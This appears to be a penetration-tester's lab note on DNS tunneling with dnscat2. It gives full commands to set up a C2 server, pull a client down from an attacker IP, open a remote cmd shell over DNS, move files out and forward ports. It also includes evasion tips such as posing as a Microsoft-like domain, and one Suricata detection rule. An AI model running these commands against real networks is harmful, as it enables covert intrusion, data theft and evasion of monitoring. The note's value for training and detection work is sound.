# DNS Tunneling with Dnscat2

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[ICMP Tunneling with SOCKS|ICMP Tunneling]], [[Web Server Pivoting with Rpivot|Rpivot]]

---

## Overview

Dnscat2 is a command-and-control (C2) tool that uses DNS protocol to tunnel encrypted data between a compromised internal host and external attack server. It transmits data through DNS TXT records, bypassing firewalls and network monitoring.

**Key Features:**
- DNS-based covert channel
- Encrypted communication
- C2 functionality
- Interactive shell access
- File transfer capability

**Use Cases:**
- Only DNS allowed outbound
- Strict firewall (no HTTP/HTTPS)
- IDS/IPS evading
- Exfiltrating data covertly
- Maintaining persistent C2

**Requirements:**
- DNS server/forwarder accessible from target
- Control over DNS records (for domain mode)
- Or direct DNS queries to your IP

---

## Installation

### Attack Machine Setup

#### Clone and Install Server
```bash
# Clone dnscat2 server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/

# Install dependencies
sudo gem install bundler
sudo bundle install
```

#### Clone PowerShell Client
```bash
# For Windows targets
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

---

## Attack Scenario

### Network Topology
```
Internal Target (Windows) → DNS Queries → Firewall → DNS Server → Attack Machine
                                         (Only DNS allowed)
```

### Environment Details
| Component | Value | Description |
|-----------|-------|-------------|
| Attack Machine | 10.10.14.18 | Runs dnscat2 server |
| Target Machine | Internal IP | Runs dnscat2 client |
| DNS Domain | inlanefreight.local | Tunnel domain |
| Protocol | DNS (UDP 53) | TXT record queries |

---

## Method 1: Direct DNS Mode (No Domain Required)

### Step 1: Start Dnscat2 Server
```bash
# On attack machine
cd dnscat2/server/
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53 --no-cache
```

**Important Output:**
```
New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_command not set
SECURITY: --secret not set, using default

IMPORTANT: Copy this PreSharedSecret!
PreSharedSecret: [RANDOM_SECRET_HERE]
```

**Save the PreSharedSecret** - you need this for client authentication!

---

### Step 2: Transfer Client to Target

#### For Windows Target
```powershell
# Download dnscat2.ps1 to Windows target
# Method 1: Direct download (if HTTP allowed temporarily)
Invoke-WebRequest -Uri "http://10.10.14.18:8080/dnscat2.ps1" -OutFile "C:\Windows\Temp\dnscat2.ps1"

# Method 2: Base64 encode/decode
# On attack machine:
base64 -w 0 dnscat2.ps1
# Copy output, then on target:
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_HERE")) | Out-File dnscat2.ps1
```

#### For Linux Target
```bash
# Clone or download dnscat2 client
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```

---

### Step 3: Execute Client on Target

#### Windows PowerShell Client
```powershell
# Import module
Import-Module .\dnscat2.ps1

# Connect with encryption
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret [SECRET] -Exec cmd
```

**Parameters:**
- `-DNSserver`: Attack machine IP
- `-Domain`: Any domain (not validated in direct mode)
- `-PreSharedSecret`: From server output
- `-Exec cmd`: Launch CMD shell

#### Linux Client
```bash
./dnscat --dns server=10.10.14.18,port=53 --secret=[SECRET]
```

---

### Step 4: Interact with Session

#### On Attack Machine
```bash
dnscat2> 
# Session appears
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

# List sessions
dnscat2> sessions
0 :: main [active]
crypto-debug :: Debug window for crypto stuff [*]
1 :: command (win-target) [encrypted and verified] [*]

# Interact with session
dnscat2> window -i 1

# Now in interactive shell
command (win-target) 1>
```

#### Shell Commands
```bash
# Execute commands
command (win-target) 1> shell
Sent request to execute a shell

# New session created for shell
New window created: 2
command (win-target) 1> session -i 2

# Now you have CMD/bash access
Microsoft Windows [Version 10.0.19042.1234]
C:\Windows\Temp>
```

---

## Method 2: Domain-based DNS Tunneling (Advanced)

**Requires:** Control over DNS records for a domain

### DNS Configuration
```
; Add to your DNS zone
tunnel.yourdomain.com.  IN  NS  ns1.yourdomain.com.
ns1.yourdomain.com.     IN  A   10.10.14.18
```

### Start Server with Domain
```bash
sudo ruby dnscat2.rb --dns domain=tunnel.yourdomain.com,host=10.10.14.18,port=53 --no-cache
```

### Client Connection
```powershell
Start-Dnscat2 -Domain tunnel.yourdomain.com -PreSharedSecret [SECRET] -Exec cmd
```

**Advantage:** More realistic DNS queries, harder to detect

---

## Advanced Usage

### File Transfer

#### Upload File to Target
```bash
# In dnscat2 session
command (target) 1> download /path/on/target/file.txt
```

Downloads file FROM target TO attack machine.

#### Download File to Target
```bash
# In dnscat2 session  
command (target) 1> upload /local/file.exe
```

Uploads file FROM attack machine TO target.

### Port Forwarding
```bash
# Forward local port through tunnel
command (target) 1> listen 127.0.0.1:3389 172.16.5.10:3389

# Access forwarded port
xfreerdp /v:127.0.0.1:3389
```

### Execute Single Command
```bash
# One-off command execution
command (target) 1> exec whoami
command (target) 1> exec ipconfig
```

### Suspend/Resume Session
```bash
# Suspend session (background)
command (target) 1> suspend

# Return to main menu
dnscat2> sessions

# Resume session
dnscat2> session -i 1
```

---

## Dnscat2 Commands Reference

### Server-side Commands
```bash
# Session management
sessions                    # List all sessions
session -i <id>            # Interact with session
window -i <id>             # Switch to window
windows                    # List all windows
kill <id>                  # Kill session

# Set options
set                        # View options
set <option> <value>       # Set option

# Help
help                       # Show help
?                         # Show help
```

### Client-side Commands (in session)
```bash
# Shell operations
shell                      # Spawn interactive shell
exec <cmd>                # Execute single command
suspend                   # Suspend session

# File operations
download <remote_path>    # Download from target
upload <local_path>       # Upload to target

# Tunneling
listen <local:port> <remote:port>  # Port forward

# Information
delay                     # Show/set delay
ping                      # Test connection

# Exit
quit                      # Close session
shutdown                  # Shutdown client
```

---

## Detection Evasion

### Slow Down Queries (Anti-Detection)
```powershell
# Add delay between queries
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret [SECRET] -Delay 1000 -Exec cmd
```

### Use Legitimate Domain
```bash
# More realistic if you control domain
Start-Dnscat2 -Domain updates.microsoft-cdn.com -DNSserver 10.10.14.18 -PreSharedSecret [SECRET] -Exec cmd
```

### Randomize Query Timing
```bash
# On server - set random delay
dnscat2> set delay 500-3000
```

---

## Troubleshooting

### Client Cannot Connect
```bash
# Verify DNS server is listening
sudo netstat -tulpn | grep :53

# Check firewall
sudo iptables -L -n | grep 53

# Test DNS resolution from target
nslookup test.inlanefreight.local 10.10.14.18
```

### Slow Performance
```bash
# DNS tunneling is inherently slow
# Typical speeds: 1-5 KB/s

# Reduce packet size
dnscat2> set max_packet_size 240

# Increase parallelism
dnscat2> set max_outstanding_packets 10
```

### Connection Drops
```bash
# Increase retransmit attempts
dnscat2> set retransmit_timeout 5000
dnscat2> set max_retransmits 10
```

### PowerShell Execution Policy
```powershell
# If Import-Module fails
powershell -ExecutionPolicy Bypass -File dnscat2.ps1

# Or
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Import-Module .\dnscat2.ps1
```

---

## Operational Security

### Detection Indicators
- High volume of DNS TXT queries
- Unusual subdomain patterns
- DNS queries to non-existent domains
- Long DNS query strings
- Regular/periodic DNS traffic patterns
- Base64-like strings in DNS queries

### Blue Team Detection
```bash
# Analyze DNS logs for:
- High entropy subdomains
- Unusual TXT record queries
- Repetitive query patterns
- Queries to single external resolver

# Example Suricata rule
alert dns any any -> any any (msg:"Possible DNS Tunneling"; dns_query; content:"."; pcre:"/[a-z0-9]{30,}/"; sid:1000001;)
```

### Evasion Best Practices
```bash
# Use legitimate-looking domain
# Add random delays
# Limit query frequency
# Use compression
# Employ legitimate DNS infrastructure
```

---

## Comparison with Other Covert Channels

| Feature | DNS (Dnscat2) | [[ICMP Tunneling with SOCKS\|ICMP]] | [[SOCKS5 Tunneling with Chisel\|HTTP (Chisel)]] |
|---------|---------------|------|------------|
| Stealth | High | High | Medium |
| Speed | Slow (1-5KB/s) | Slow | Fast |
| Detection Difficulty | Hard | Hard | Easy |
| Firewall Bypass | Excellent | Excellent | Good |
| Setup Complexity | Medium | Hard | Easy |

**Use DNS Tunneling When:**
- Only DNS allowed outbound
- Stealth is priority over speed
- Long-term C2 needed
- Need covert exfiltration

**Use Alternatives:**
- [[ICMP Tunneling with SOCKS|ICMP]]: DNS blocked but ICMP allowed
- [[SOCKS5 Tunneling with Chisel|Chisel]]: HTTP allowed, need speed
- [[SSH Socks Tunnel PF|SSH]]: Direct access available

---

## Quick Reference

```bash
# Server setup
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53 --no-cache

# Client (Windows)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain domain.com -PreSharedSecret [SECRET] -Exec cmd

# Interact
dnscat2> sessions
dnscat2> window -i 1
command (target) 1> shell

# File transfer
download <remote_file>
upload <local_file>

# Port forward
listen 127.0.0.1:3389 172.16.5.10:3389
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[ICMP Tunneling with SOCKS|ICMP Tunneling Alternative]]
- [[Defending and Detection/Defending and Detection|Detection & Defense]]
- [[Web Server Pivoting with Rpivot|HTTP Tunneling]]

**Tags:** #dns-tunneling #dnscat2 #covert-channel #c2 #firewall-bypass #data-exfiltration